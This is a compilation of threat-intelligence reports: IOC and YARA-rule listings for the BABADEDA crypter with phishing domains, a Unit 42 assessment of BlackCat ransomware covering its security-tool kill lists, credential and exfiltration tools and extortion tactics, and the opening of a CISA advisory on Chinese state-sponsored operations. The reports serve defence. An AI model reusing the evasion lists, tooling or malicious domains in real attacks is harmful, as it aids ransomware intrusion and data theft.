IOCs The sample used in the blog post: File SHA256 Installer 99e6b46a1eba6fd60b9568622a2a27b4ae1ac02e55ab8b13709f38455345aaff difserver.exe 358211210e0bb34dd77073bb0de64bb80723f3434594caf1a95d0ed164ee87a1 libfont-0.6.dll ce3758d494132e7bef7ea87bb8379bb9f4b0c82768d65881139e1ec1838f236c libxml3.dll 0ceead2afcdee2a35dfa14e2054806231325dd291f9aa714af44a0495b677efc menu.xml 080340cb4ced8a16cad2131dc2ac89e1516d0ebe5507d91b3e8fb341bfcfe7d8 YARA Rule rule BABADEDA_Crypter { meta: description = "Detects BABADEDA Crypter" author = "Morphisec labs" reference = "https://blog.morphisec.com/the-babadeda-crypter-targeting-crypto-nft--defi-communities" strings: $entry_shellcode = {55 8B EC 83 EC 58 53 E8 F8 03 00 00 89 45 FC 8B 45 FC 83 C0 11 89 45 CC 8B 45 FC 8B 40 09 8B 4D CC 8D 04} $placeholder_1 = {8138DADEBABA} $placeholder_2 = {8138AFBEADDE} condition: $entry_shellcode and all of ($placeholder_*) } Decoy Domains aave-v3[.]comabracodabra[.]netalchemixfi[.]comapeswaps[.]netapp.sushi-v3[.]comarbitrums[.]comartblocks[.]usastar-network[.]comavalanche-network[.]comavax-bridge[.]comavax-bridge[.]netavax-network[.]netavax.wallet-bridge[.]netavax.wallet-network[.]netavax.wallet-network[.]orgbabydogescoin[.]comboredpeyachtclub[.]combridge-avax[.]combridge-avax[.]netbridge-avax[.]usc-nft[.]netcasper-network[.]comcompoundfinance[.]netcryptoblade[.]netdecentralands[.]netdiviprojects[.]comdydxexchange[.]netgalagamesapp[.]comhedera[.]runilluviums[.]comkeep-network[.]netklimadao[.]netlarva-labs[.]netlarvaslab[.]comlooprings[.]netluckybuddhaluckyclub[.]commangomarkets[.]netmineofdalarnia[.]netmonstasinfinite[.]netmoonebeam[.]comnear-protocol[.]comnetwork-avax[.]netnetwork-avax[.]orgnft-opensee[.]comolympusdao[.]fundopenseaio[.]netopenseea[.]netoptinism[.]netpolkadot-network[.]comprojectseeds[.]netprojectsserum[.]netrareble[.]netrocketspool[.]netsecretswaps[.]netsia-tech[.]netsolanarts[.]comsolsoulnft[.]comsushi-app[.]comsushi-v3[.]comsushi-v3app[.]comterra-money[.]netthetatokenfund[.]comwallet-avalanche[.]comwallet-avalanche[.]netwallet-avalanche[.]orgwallet-avax[.]comwallet-avax[.]infowallet-avax[.]netwallet-bridge[.]netwallet-network[.]netwallet-network[.]orgwa let.bridge-avax[.]uswallet.network-avax[.]orgwonderlaned[.]comzed-run[.]net Hashes 0098b2c38a69132bfde02d329d6c1c6e2b529d32d7b775a2ac78a369c0d108530115ba0f26a7b7ca3748699f782538fa761f7be4845a9dc56a679acea7b76cd3062f019515bff366fcbf49cca3f776c21e2beb81c043a45eea81044a9391fd97112282b873bdbeb5614fc8658934a99d666ba06c4e2840a21cd4458b426a4cad120213353ac7bd835086e081fb85dfa4959f11d20466fd05789ded3bff30bb111252c9103805e02324d2aecb5219e6a071c77b72477eba961621cb09a2138972140d9a4a2ec5507edf7db37dcc58f2176a0e704e8f91c28a60a7f3773e85e1aa14da3566bc9f211528c1824330c46789396447c83c3c830bb91490d873025df818c01e1f6e0185752dbf8c9352d74ade56ac40d25ae701d4a5954b74d0c7aeea196ec622eb7d9420b1c04b3856467abeb3ca565d841f34c3c9a628afc10775c8214d6681f5d82d4fa43e7a8676935ef01ddab8d0847eb3018530aedffe7ebb552e5455e268cf12ebc0213aa5dacb2239358c316dda3ec0f99d0f36074f41fb092fc8dedf82997894bb31a0eca96ae3c589863ec9bf4d1e2af0a84f2e9c3ef3013270599801099d3b5399eb898f79d7b7ec0d728c71d5177244b8110757365ade39b4dc69dd29011135732a881152f99dc19310cb906b7255a3e9ef367258094d3c844e66f0dafdced0861a8e2ff54fd762ba170bf5082fb2c38cdbbac5a7fecb3e52c251dc8683e0f374bcbea27b4b700c05dc39db13336859acbbd32590fe7c3e6a29c04270a4b62375946fdb4c392a1c9b3f64ef391f85bdd67cb78426889f44e00bef4b6d3f03a845208b925c129a5fe1b9ef6ed8cd27144c5e94176aaa6e462f7543326630d209b6433936f0c54f8920d6b5505e88d802ee060320ea81064e6eed44594054ea42f9860c1e53744649a319788e2cb7f1f624e435cbdec43d54391ff27b632a36430889dda51cfa46b694badcae2f0ce952065642c94d89df6342d9c9e087945651b11cec4903f083a20d31182e0be5b2b6030df0a980ff6865363debbbb9a691838e823c34807a9770db30c2af616c5574231af2b16d6aef6e4d56a438062210ba8ca68dee690c1692960ff36936c96586f74ee194e1c8216f247a74aa62fea0577da869fda841170ce6f1fe0e1b9f3b0d8172d336bb7dc671d0c5b5916cc5f91370f42fbfd249795e7c40526ae204becdd20fe453b53e8d72df0397893e1ac981063fbcc0ad048543ba7143ba824f2bb0aa5dfb61538ce67c8242812137aad072fe1cb78d49d01187b869d43ebcfcd87eb590c1bc9f12467e827e1981d2ccaec16a5b646976b0d492d555a20b9ba5dd4ba0d605dfcab2f786b1cf4e6952db195842809ffd7e88e5fdaca8b2b2c0005e995d34cbe9d157ad8b9120fc400510de52fb5c6689f403e5c0aaba3ff58e2ee114286c2cf09615b58ce8c448b5958da3c59874594de428b783116d8c1cf440ab804633799d88af8e90faf9b85d96a09cb689be3a52669a58df2e9ea53b150a97d05de641e624f63495d226710f37a870a338344afac6350b48c5d70c7ac8518c42f694eb0f6aa7c59b132e1d883c4f513d4ac3a5735a28a1917cfde837ee4a4b632a66cce5aa8be2a2545370b390e52376d12776152aff9285b9b3fe6610d2f8dd24b11ccb14c5b3a2e090192bf0b3b00f5bbef0b81858bc17861fedd82e93f0ab6d60777ca6820eaf0c213a2cfb62e6a9ce788c3860c627e035401b75df7f60eb64d4f4bc196aa2b5fe6db30b741f515df94238c8d1a3c51a84fe72f218751c86a254801c3233eeb6dc8341fd38dacb7a2a38a14a21afbab8e7e3f31f2fd29f0bcd7d4eb83e203cbcaaab0cd2178acdf025c7f23f10ab01906a99aca5d07e3a7e261928f8f91695c21e2be7324afb67f1e5cf9fbc95dc346db2ec62d9d8db7b0da9377a00346f41c97893d936b5e1203fb926e7ab612ffd488578e9791f07be4a6eabc83645fb5bca70f7b046f5909f0134a1c465fda3794344f45055ba2dfa802623bd326fe5b6d360daf106314561e9ec57075dd4f544ad52680678a644e186758650a405b765d548c2e3479c6c7a20ffa8a8402aa00c45aaef24102daf5c94c54a8a6013f370d76e7a14ab20d3f28de1ecef803d8b1629ed077495db5ec7b7f5828ed33c684ede644e637da7cd117517b1bb96ee0f58131515013a322366d680f613afa31bc4e5f55a5ecd7315c9e028738ced66d42852569dd061e15610a054c2121c9ed4d9e99d32952bda84f32425681229ec544849156e479b7247e3e480f3a23a39c915f24492ceab91f70c3dd3c5040184dae3bc38804c872ae948ed1ee6906a890b16fb04bc486bf7b6574b5b7caf1ed4f1a21e9e7463adf312219f767a58e8fb2be1fde7bd78e2085f364e0eb145c77b57b8bfa5bacf6a3e6eaed4b9e3a97c065a80fde8ca7c729a25e723a3738a1b5520f29ef2100ba2d9a2739aa30176b039f511 Crypter hashes amadey stealer 4d02224a7dadfc2d8a1343fdc51e4634a98bd073f867bfd091e667efd112108a384292cad1c05552ccbd691de48865ce75375f7e601db66b3f5cad0f8f294d6c5dd0e9ef811c199a06758d65b66d051d3b0057971b021df0928ede727fe17371e312af68203fd80a2dd86a69460941ce29709424310abffd66fd7323a2b8ef6e Cryptbot 83aa33a24f0751cae8342045071638739981304b37fc036da342f15ccebaf482c69fd2882bcda2ae6b24235babcc570f31774a45698edbaaea70e1b9d9fd315e58fba0f609b5363b1fbb792e0b2def924b770b2f57329f383cf691ef5988055e1a31f5a7bc1c5782ab9e7a401a2a474ee75e571adfa1f7685c13258653e8af7d2dc6785721bc9369090ce77d47b6b85eb4c9fba88d4c29675b5c98195c653f3c89d3acf2cfd33516f0aaaf901226c1c8936c33ded480115cbb56b4d11fc0d4053f3f0c883ada23e33685a015dbd59a08668fa80bf3248b4fbc3b00dac1fb430566b5d71b2ae6f7569b050130ccb548785925d4ff14ccfd5fa9738e8b444cbd97d2fc2159debd0a2222673cdc028c5f88ca5cc6c72f5665d60c5d27806757cff28e113203dd97f0f33562db9086b0eadeb5ea1242738abd80ae872ac3552a259958b3a4ec25d09191c9f5cb064a4ac4ea35a51cf1dd5e26e5d5bc63662c49c2ce3fdd54336ae1400d16fd36013844953d8cbfa2982516f3d40ed2a18f58f826092b7425ae37127535adf331bdba2e4b126dc7a67890f2974fa95624b06b3ff248a49d63a099d6499875e6b46268054b63d582303c7eac93a65ff00537ab22f487d69e8d0678be5a8da741058f0ae2a6f99ffb8e3326ac50fda54336b23a546fc6e51597f0749cbb7b8b53795383f891158ab7a5af350d803f8bba787ba1d3af87240e6edb33f1d5578084bd8422792770d3bafea1581b58e45eb6f89a889f41bddd5f6a8a3f255be6e5b8c7402be7059298bcfea15931752e10ea0be59ad080633b0cf91645b6ac772fc518bd5d145db4e7750af4e8239cc46734350ddf4595bd85c2e909efb713bdb2fb402dd380ada3bcc5ff92776ab95cafaeda7e47ea6dc494f8745d09bc73fa393b77c944bb7230fc68235fd5049c32c31612eb31747224fe828cf68e77f09d903d17e4318e585ca5753b5cc1a8e7fdb081244ee6e2946436cba5140248916ece6706fee52c892e7284b8c1dde007b273cf8adf1e2565ae979a0dd895e91925b1664d6e475f5046c1b0243a9999b6d15c96480437ddf93165a1fe7f19a41fbf7ac6196d5e54900558c948603a86de7e49201295562937237c34b54d3dd6d4b36587667cb52201ca8412ec23e0a6d062cceddb703104d0c9ca00f9b232a297b1896a96c01b4835cafa0b050d62b6b891b74d6c799e6e6d263f6c89a650f439f01b2435425946f5b5eab475da42ee04088fd552bc59644613fd274f7faace98d5660ea1a13dd74cade60626bf10cc5e4a66c0c76d8e018ad8496e1715c87a07b92d9214810bcd3fc6880b88b93246e94ad9421f34340766606ff84a220c1f0d6c078de2bc9961dcda11ea21eabebc86576798f5d1a0548e113d59fa24db23fb548796b2632a3c94ea6be2c2a64236b470bcbcb5bfc6e1d9158a217e632ef9f099bae955699c9eb497c6227a642486f64c903a336fdd0f3ac503b9c509e7ff704be0431c541a3571360b52edac361b3d9ce627b4e93c53be17bbe8ee94ed612d25d1378980dbe529ad018f1a2ed0521c0621f81ae54bc2d516c885a22bdd7d046c4a616e639cc91dc94cabb972108bdc2d9540fcbe393241d11ef9df7881ad13c6865aa6161390df6580eb648c3c05a35db706c7b5d7a238f56009bf01b6ede3fd35ef88aee476c1cb77ed32c54fd467b2d6173b59af8510c2d90f581c543cba58332c5c67e2a464387142e72bb9d6960bcc9dd52ef2a948f4db9b014740b96a6b7e277cf456a19260533dadf8b36652d05e374b098c93f63cdf7f07f9b0c6ff27b0011f3a6daa5ca4b73f554b6a1ed319dce05919c3c4e18cdc5ffac866a06926359e00872ce7cc7b85d2ddf09abdc3371ac101be4e7ed46e98110cbc2802dc27b9d9fe5ba5ceeece06cf3ed93974dfeb1ce26f2b5c43e23c75837a43d3df5f8ec3117279edcfc255c69be9aaf2eed9d0d3cc98bf3b06ae01ae0cd5b88a754affa47410a0fa9d9b38582c21b8e06c32273206fa15551efdb3beb4c0c6486545826c2ec5fa5ba44d02abeb20558e55f47c51366523cacdde2750f424ee3a86842df558da44cc247fd7bd4d1d7bf5439b8732883aa840a9fceb0bf886695f19c711bd63d145518301270e247830259eb29c83bd0ee135f53ee7aa2e234a48e1f19d8dfd1885aa7ea0c73b1d22faee0f3b208dc65762e6ba374d49caac5d027dadb4db266ac999842ed7ea10b245750f8b31af738b4bfdcc5ade464f8fc360e64cdf07c837d5911f93b60cb99ee0ff531ffb0422652c7d6124d60ef94ff905ef764a4aab4cc90d657dd681b434e13df35c01c6473ee3813dd34e64b451280c906afb57198e787eaa18780abd3932bc7cf3742a5e58ccb1ccf204 lockbit 778eb09cac51aa75b6e3c32e78adfe0e9292af40d0f800fb3ae569198945a9ef5b9e6d9275e9523aa3945be891745442a07b936ee5236e23934250ba3844f65f17c6f4e45d44bd4c06212139f521976b87ed5a6ddcd0e4e5e978e64dabb3883f237bc833db8c72cedf0a09bd642567aa31cc74dd6bcfe5b67871f375d617ec85446736e381fa8942f8d32cb4f2ae8fb6a9245fa0e70b7f7298ee7a5cb6fe9f32668434940877f747a5d3adc745548bcfdcc881418f02e705204df2ad54a311cb74b4d14d2d1af6642d5867eb89c277aa02f5e4ac667d87b5aca380f40eabe1bfc920b2de025019e9a406e9b2f0ac2cbbfc18d65eac15f59ca8921c5fb4bfa240d25116f1fe5c9a22fcf73c4c7358f93f1ad445bb9a602d18ff69f8fa29d0be0fe80579baf175626787070bf61f75b4b810eb9d9bdb653972ad40797ee5ff82cc1ee311c3f24397de3f6671b67a263206e78f8040f5ac2fc0182d0ee171c532284b3a396f8230fc87b7fc47aa1d7ed19c78867f3dd43fd570ea93748390be58d5 ursnif 04595c3111276f02b6dc2ece0778cb5829c086484aeafa24e0aac3d8479deb4be2c83783d6ab57ac91d99bfb9d607d0b5537e305661406bbf2347c3af92d3464676a540a91b9ffb4a18af0f4355561f3579ee4cbbf0740a80e482af92e8cdc07716ce7fe411f352686b4071074aa96e1456ab7a67445b3cf1c475e18a4e5ac25ceba6a7f9a2c25a35090470c6209aefed808786c47194a18415a7898390c20cbe203345d8120bd6d29e667bbceb92083ebb55e36b21cd22d669aa2f91830a656 smokeloader 79ae89733257378139cf3bdce3a30802818ca1a12bb2343e0b9d0f51f8af1f101ae5c809ea8fabce9c699c87416d73ba5ab619accef6deeb26c2c38f39323181ee8f0ff6b0ee6072a30d45c135228108d4c032807810006ec77f2bf72856e04a fickerstealer bd8d1264a88d5cdd701a4ee909b70beaec39d216c988b33bfb30f25aee3540ee1f53d6f4fb02c8663b9d377570953d07c56df297674b7c3847d1697f0e5f8165cf88923b7d0287884870af999a8d64f90c7deeb4c4d09feed406472ff259b30d Metasploit Reverse HTTP b8990f204ca595e23562aa8063fd163651771626ba4acf45890f25315616fc1e quasarrat e8a8581cd3594a3937762f90d20ab889e7868bb88e9249f96222bd48643d7dea 
title: Threat Assessment: BlackCat Ransomware url: https://unit42.paloaltonetworks.com/blackcat-ransomware/ This post is also available in: 日本語 (Japanese)Executive Summary BlackCat (aka ALPHV) is a ransomware family that surfaced in mid-November 2021 and quickly gained notoriety for its sophistication and innovation.
Operating a ransomware-as-a-service (RaaS) business model, BlackCat was observed soliciting for affiliates in known cybercrime forums, offering to allow affiliates to leverage the ransomware and keep 80-90% of the ransom payment.
The remainder would be paid to the BlackCat author. 
BlackCat has taken an aggressive approach to naming and shaming victims, listing more than a dozen on their leak site in a little over a month.
The largest number of the group’s victims so far are U.S. organizations, but BlackCat and its affiliates have also attacked organizations in Europe, the Philippines and other locations.
Victims include organizations in the following sectors: construction and engineering, retail, transportation, commercial services, insurance, machinery, professional services, telecommunication, auto components and pharmaceuticals. 
Use of BlackCat ransomware has grown quickly for a variety of reasons (for comparison, AvosLocker had only listed a handful of victims publicly within two months of becoming known).
Effective marketing to affiliates is a likely factor – in addition to offering an enticing share of ransom payments, the group has solicited affiliates by posting ads on forums such as Ransomware Anonymous Market Place (RAMP). 
The malware itself is written in Russian and coded in the Rust programming language.
Though this is not the first piece of malware to use Rust, it is one of the first, if not the first, piece of ransomware to use it.
By leveraging this programming language, the malware authors are able to easily compile it against various operating system architectures.
Given its numerous native options, Rust is highly customizable, which facilitates the ability to pivot and individualize attacks. 
The threat actors leveraging BlackCat, often referred to as the "BlackCat gang,” utilize numerous tactics that are becoming increasingly commonplace in the ransomware space.
Notably, they use multiple extortion techniques in some cases, including the siphoning of victim data before ransomware deployment, threats to release data if the ransom is not paid and distributed denial-of-service (DDoS) attacks. 
Palo Alto Networks detects and prevents BlackCat ransomware with the following products and services: Cortex XDR and Next-Generation Firewalls (including cloud-delivered security subscriptions such as WildFire). 
Due to the surge of this malicious activity, we’ve created this threat assessment for overall awareness.
Full visualization of the techniques observed, relevant courses of action and IOCs can be viewed in the Unit 42 ATOM viewer. 
Table of Contents BlackCat Ransomware OverviewTechnical Details • BlackCat Config • Associated ToolsPost-compromise ActivitiesCourses of ActionConclusionAdditional ResourcesAcknowledgments BlackCat Ransomware Overview Soliciting via known cybercrime forums, BlackCat is seeking affiliates to deploy its ransomware.
Affiliates keep an 80-90% share of the ransom payment, with the remainder going to the BlackCat author.
These affiliates are interviewed and vetted before being accepted into the RaaS group.
Once the affiliate is confirmed, they are given unique access to a Tor-based control panel that hosts the affiliate’s access. 
Written in the Russian language, the control panel gives the affiliate updates and announcements about deploying and operating the ransomware as well as troubleshooting tips to help the affiliate be more successful in their campaigns.
Along with the control panel, a name and shame blog is also hosted, targeting victims who have either ignored or refused to pay the ransom.
This site has been regularly updated with new victims since the initial discovery of the group. 
As shown in Figure 1 below, many RaaS operators use the double-extortion technique of exfiltrating data prior to encryption, which provides them greater leverage in negotiating ransom funds.
As of December 2021, BlackCat has the seventh largest number of victims listed on their leak site among ransomware groups tracked by Unit 42 – impressive considering that this group has only been publicly known since November 2021.
While Conti (ranked second) has been around in various guises for almost two years, it is surrounded at the top of the chart by emerging families.
LockBit 2.0 and Hive both have at least six months’ head start on BlackCat, but this highlights a worrying trend that newcomers (or reformed groups) can attack many victims in a short space of time. Figure 1.
Leak site/name and shame blog statistics, December 2021.Using the leak site information, we can understand the location and types of victims affected by BlackCat attacks.
Victims include organizations in the following sectors: construction and engineering, retail, transportation, commercial services, insurance, machinery, professional services, telecommunication, auto components and pharmaceuticals.
Figure 2 breaks down the victims by country.
However, the so-far sporadic spread of the attacks may indicate a somewhat opportunistic approach, as with most contemporary ransomware families. 
Figure 2.
BlackCat leak site victims by country.
Technical Details BlackCat is positioned to pivot to individualized, customized attacks due to the numerous options available when coding in Rust (Figure 3).
Rust programming has gained momentum due to its fast and high performance, powerful web application development, low overhead for embedded programming, and memory management resolution.
Rust also facilitates the BlackCat author due to its efficiency regarding algorithms that power the encryption capability of the ransomware.
Because of its efficiency and adaptability, BlackCat has been seen targeting both Windows and Linux systems. 
Figure 3.
BlackCat execution options.
In an effort to maintain longevity, the use of the --access-token flag is required to execute the ransomware, which can make it harder to analyze in sandboxed environments. 
BlackCat Config While analyzing the ransomware configurations, we observed numerous evasion tactics deployed.
These evasion techniques are used in an effort to impair or disable system defenses as well as to stop certain applications that may lock files open on disk, causing problems when trying to encrypt them.
BlackCat attempts to kill several processes and services to hinder or prevent security solutions and backups.
The process list checked is as follows: agntsvc, dbeng50, dbsnmp, encsvc, excel, firefox, infopath, isqlplussvc, msaccess, mspub, mydesktopqos, mydesktopservice, notepad, ocautoupds, ocomm, ocssd, onenote, oracle, outlook, powerpnt, sqbcoreservice, sql, steam, synctime, tbirdconfig, thebat, thunderbird, visio, winword, wordpad, xfssvccon, *sql*, bedbh, vxmon, benetns, bengien, pvlsvr, beserver, raw_agent_svc, vsnapvss, CagService, QBIDPService, QBDBMgrN, QBCFMonitorService, SAP, TeamViewer_Service, TeamViewer, tv_w32, tv_x64, CVMountd, cvd, cvfwd, CVODS, saphostexec, saposcol, sapstartsrv, avagent, avscc, DellSystemDetect, EnterpriseClient, VeeamNFSSvc, VeeamTransportSvc, VeeamDeploymentSvc 
The services running on the compromised system are checked against the following list: mepocs, memtas, veeam, svc$, backup, sql, vss, msexchange, sql$, mysql, mysql$, sophos, MSExchange, MSExchange$, WSBExchange, PDVFSService, BackupExecVSSProvider, BackupExecAgentAccelerator, BackupExecAgentBrowser, BackupExecDiveciMediaService, BackupExecJobEngine, BackupExecManagementService, BackupExecRPCService, GxBlr, GxVss, GxClMgrS, GxCVD, GxCIMgr, GXMMM, GxVssHWProv, GxFWD, SAPService, SAP, SAP$, SAPD$, SAPHostControl, SAPHostExec, QBCFMonitorService, QBDBMgrN, QBIDPService, AcronisAgent, VeeamNFSSvc, VeeamDeploymentService, VeeamTransportSvc, MVArmor, MVarmor64, VSNAPVSS, AcrSch2Svc In an effort to maintain persistence, the BlackCat ransomware excludes key system and application folders – as well as key components – from encryption so as not to render the system and ransomware inoperative.
The folders excluded are as follows: system volume information, intel, $windows.~ws, application data, $recycle.bin, mozilla, $windows.~bt, public, msocache, windows, default, all users, tor browser, programdata, boot, config.msi, google, perflogs, appdata, windows.old Excluded file names are as follows: desktop.ini, autorun.inf, ntldr, bootsect.bak, thumbs.db, boot.ini, ntuser.dat, iconcache.db, bootfont.bin, ntuser.ini, ntuser.dat.log Any file with an extension matching the following list will also be avoided: themepack, nls, diagpkg, msi, lnk, exe, cab, scr, bat, drv, rtp, msp, prf, msc, ico, key, ocx, diagcab, diagcfg, pdb, wpx, hlp, icns, rom, dll, msstyles, mod, ps1, ics, hta, bin, cmd, ani, 386, lock, cur, idx, sys, com, deskthemepack, shs, ldf, theme, mpa, nomedia, spl, cpl, adv, icl, msu Hardcoded credentials stored within the BlackCat ransomware config lend credence to the likelihood that specific victims are being targeted.
The credentials also allow BlackCat to move laterally within the victim’s system and/or network, often with administrative privileges.
Credential access permits the ransomware to deploy additional tools that further propagate the attack.
These observations have also been confirmed by Symantec. 
Associated Tools BlackCat has been observed using multiple – often legitimate – tools throughout their attacks, such as Mimikatz, LaZagne and WebBrowserPassView to recover stored passwords, as well as GO Simple Tunnel (GOST) and MEGAsync to exfiltrate data.
Additionally, anti-forensics tools like fileshredder, an application to securely delete unwanted files beyond recovery, have also been leveraged during some BlackCat ransomware attacks investigated by Unit 42. 
Post-compromise Activities Once candidate systems have been identified for encryption by the threat actors, the ransomware deployment occurs and all viable files will be encrypted.
This process often involves renaming files to include another or a different file extension, such as wpzlbji, in the example shown in Figure 4.
As is commonplace with other ransomware strains, BlackCat ransomware will drop ransom notes on the compromised system(s) to inform the victim of what has happened and how to go about getting their data restored.
Text files with the name RECOVER-[RANDOM]-FILES.txt (where [RANDOM] refers to the aforementioned file extension name) will be found on the compromised system containing information and instructions such as those in the example below: Figure 4.
An example of a BlackCat ransom note dropped on a compromised system.
BlackCat utilizes a unique onion domain with a victim-specific access key for the victim to use to learn more about the attack, their data, and what the threat actors want the victim to do next.
The following example URL highlights the notation used by BlackCat ransomware: http://2cuqgeerjdba2rhdiviezodpu3lc4qz2sjf4qin6f7std2evleqlzjid[.]onion/?access-key=${ACCESS_KEY}","note_short_text":"Important Once the victim navigates to the onion site provided, they will see something similar to Figure 5 below.
This site reiterates the problem and that the actor's Decrypt App private key is the only way to get their data back.
The portal also provides chat facilities, the ransom amounts – which can differ depending on when the payment is sent – how to pay, and a way to test that the decryption works. 
Figure 5.
Example onion site information for BlackCat victims.
Unit 42 has observed BlackCat affiliates asking for ransom amounts of up to $14 million, though they offered to discount this demand to $9 million if paid before the established time.
Interestingly, the ransom demand gives the victim the option to pay not only in Bitcoin (the most common option) but also in Monero. 
In some cases, BlackCat operators use the chat to threaten the victim, claiming they will perform a DDoS attack on the victims' infrastructure if the ransom is not paid.
When it appears in addition to the use of a leak site, this practice is known as triple extortion, a tactic that was observed being used by groups like Avaddon and Suncrypt in the past. 
One unique feature of BlackCat ransomware is that negotiation chats can only be accessed by those holding an access token key or ransom note – the group has made efforts to avoid third-party snooping. 
Courses of Action This section documents the relevant tactics, techniques and procedures (TTPs) used by BlackCat ransomware and operators, mapping them directly to the Palo Alto Networks product(s) and service(s) protecting against them.
It also further instructs customers on how to ensure their devices are appropriately configured. 
Product / Service Course of Action Discovery 
The below courses of action mitigate the following techniques: Process Discovery [T1057], File and Directory Discovery [T1083] CORTEX XDR PREVENT Configure Behavioral Threat Protection under the Malware Security Profile Lateral Movement 
The below courses of action mitigate the following techniques: Lateral Tool Transfer [T1570] THREAT PREVENTION† Ensure that antivirus profiles are set to block on all decoders except 'imap' and 'pop3' Ensure an anti-spyware profile is configured to block on all spyware severity levels, categories and threats Ensure a secure antivirus profile is applied to all relevant security policies Command and Control 
The below courses of action mitigate the following techniques: Multi-hop
Proxy [T1090.003] THREAT PREVENTION† Ensure passive DNS monitoring is set to enabled on all anti-spyware profiles in use Ensure an anti-spyware profile is configured to block on all spyware severity levels, categories and threats Ensure a secure anti-spyware profile is applied to all security policies permitting traffic to the internet Ensure that antivirus profiles are set to block on all decoders except 'imap' and 'pop3' Ensure DNS sinkholing is configured on all anti-spyware profiles in use Ensure a secure antivirus profile is applied to all relevant security policies ADVANCED URL FILTERING† 
Ensure that URL Filtering uses the action of “block” or “override” on the URL categories Ensure secure URL filtering is enabled for all security policies allowing traffic to the internet 
Ensure that Advanced URL Filtering is used Ensure that access to every URL is logged Ensure all HTTP Header Logging options are enabled CORTEX XSOAR Deploy XSOAR Playbook - PAN-OS Query Logs for Indicators Deploy XSOAR Playbook - Palo Alto Networks - Hunting And Threat Detection NEXT-GENERATION FIREWALLS Ensure 'SSL Forward Proxy Policy' for traffic destined to the internet is configured Ensure 'SSL Inbound Inspection' is required for all untrusted traffic destined for servers using SSL or TLS Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources exists Ensure that the Certificate used for Decryption is Trusted Exfiltration 
The below courses of action mitigate the following techniques: Exfiltration to Cloud Storage
[T1567.002] URL FILTERING† Ensure secure URL filtering is enabled for all security policies allowing traffic to the internet Ensure all HTTP Header Logging options are enabled Ensure that URL Filtering uses the action of ‘block’ or ‘override’ on the URL categories Ensure that access to every URL is logged Ensure that Advanced URL Filtering is used Impact The below courses of action mitigate the following techniques: Data Encrypted for Impact [T1486], Service Stop [T1489],
Inhibit System Recovery [T1490] CORTEX XSOAR Deploy XSOAR Playbook - Ransomware Manual for incident response. 
Deploy XSOAR Playbook - Palo Alto Networks Endpoint Malware Investigation Table 1.
Courses of Action for BlackCat ransomware.†These capabilities are part of the NGFW security subscriptions service Conclusion BlackCat is an innovative and sophisticated ransomware family that is rapidly forming a reputation for its highly customized and individualized attacks.
By leveraging the Rust programming language, the malware authors are able to easily compile it against various operating system architectures, which facilitates the group’s ability to pivot from one victim to the next.
As seen with other ransomware families, BlackCat operates with a RaaS model and utilizes multiple extortion techniques, then publishes a leak site to further pressure victims into paying the ransom. 
Palo Alto Networks detects and prevents BlackCat ransomware in the following ways: WildFire: All known samples are identified as malware. 
Cortex XDR with: Indicators for BlackCat. 
Anti-Ransomware Module to detect BlackCat encryption behaviors on Windows. 
Local Analysis detection for BlackCat binaries on Windows. 
BTP rule prevents Ransomware activity on Linux. 
Next-Generation Firewalls:
DNS Signatures detect the known command and control (C2) domains, which are also categorized as malware in URL Filtering. Indicators of compromise and BlackCat-associated TTPs can be found in the BlackCat ATOM. 
If you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call North America Toll-Free: 866.486.4842 (866.4.UNIT42), EMEA: +31.20.299.3130, APAC: +65.6983.8730, or Japan: +81.50.1790.0200. Palo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance (CTA) members.
CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.
Learn more about the Cyber Threat Alliance. 
Additional Resources Acknowledgements We would like to thank Simon Conant for his help with sample collection, and malware and infrastructure analysis. 
Get updates from Palo Alto Networks! 
Sign up to receive the latest news, cyber threat intelligence and research from us 
title: AA21-200B: Chinese State-Sponsored Cyber Operations: Observed TTPs url: https://us-cert.cisa.gov/ncas/alerts/aa21-200b Original release date: July 19, 2021 | Last revised: August 20, 2021SummaryThis advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK:registered:) framework, Version 9, and MITRE D3FEND:trade_mark: framework, version 0.9.2-BETA-3.
See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques and the D3FEND framework for referenced defensive tactics and techniques. 
The National Security Agency, Cybersecurity and Infrastructure Security Agency (CISA), and Federal Bureau of Investigation (FBI) assess that People’s Republic of China state-sponsored malicious cyber activity is a major threat to U.S. and Allied cyberspace assets.
Chinese state-sponsored cyber actors aggressively target U.S. and allied political, economic, military, educational, and critical infrastructure (CI) personnel and organizations to steal sensitive data, critical and emerging key technologies, intellectual property, and personally identifiable information (PII).
Some target sectors include managed service providers, semiconductor companies, the Defense Industrial Base (DIB), universities, and medical institutions.
These cyber operations support China’s long-term economic and military development objectives. 
This Joint Cybersecurity Advisory (CSA) provides information on tactics, techniques, and procedures (TTPs) used by Chinese state-sponsored cyber actors.
This advisory builds on previous NSA, CISA, and FBI reporting to inform federal, state, local, tribal, and territorial (SLTT) government, CI, DIB, and private industry organizations about notable trends and persistent TTPs through collaborative, proactive, and retrospective analysis. 
To increase the defensive posture of their critical networks and reduce the risk of Chinese malicious cyber activity, NSA, CISA, and FBI urge government, CI, DIB, and private industry organizations to apply the recommendations listed in the Mitigations section of this advisory and in Appendix A: Chinese State-sponsored Cyber Actors' Observed Procedures.
Note: NSA, CISA, and FBI encourage organization leaders to review CISA Joint Insights: Chinese Malicious Cyber Activity: Threat Overview for Leaders for information on this threat to their organization. 
Click here for a PDF version of this report. 
Technical DetailsTrends in Chinese State-Sponsored Cyber Operations NSA, CISA, and FBI have observed increasingly sophisticated Chinese state-sponsored cyber activity targeting U.S. political, economic, military, educational, and CI personnel and organizations.
NSA, CISA, and FBI have identified the following trends in Chinese state-sponsored malicious cyber operations through proactive and retrospective analysis: Acquisition of Infrastructure and Capabilities.
Chinese state-sponsored cyber actors remain agile and cognizant of the information security community’s practices.
These actors take effort to mask their activities by using a revolving series of virtual private servers (VPSs) and common open-source or commercial penetration tools. Exploitation of Public Vulnerabilities.
Chinese state-sponsored cyber actors consistently scan target networks for critical and high vulnerabilities within days of the vulnerability’s public disclosure.
In many cases, these cyber actors seek to exploit vulnerabilities in major applications, such as Pulse Secure, Apache, F5 Big-IP, and Microsoft products.
